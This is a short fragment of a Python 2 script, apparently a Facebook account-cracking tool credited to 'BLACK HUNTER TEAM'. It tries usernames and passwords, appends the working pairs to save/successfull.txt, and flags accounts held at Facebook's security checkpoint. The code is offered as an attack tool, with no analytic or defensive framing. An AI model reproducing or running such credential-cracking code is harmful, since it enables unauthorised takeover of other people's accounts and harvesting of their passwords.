...
def menu():
    ...
    print '\x1b[1;93mAUTHOT   : \x1b[1;92mBD JAHIED'                                           
    print '\x1b[1;93mFB GROUP : \x1b[1;92mBLACK HUNTER TEAM'
    print '\x1b[1;93mGITHUB   : \x1b[1;92mBLACK-HUNTER-TEAM'
    print ''
    print '\x1b[1;97m============================================'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[BHT-OK]\x1b[0m ' + k + c + user + ' | ' + pass1  +  '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[BHT-CP]\x1b[1;93m ' + k + c + user + ' | ' + pass1  +  '\x1b[1;93m  [Open After 07 Days]\x1b[0m \n'
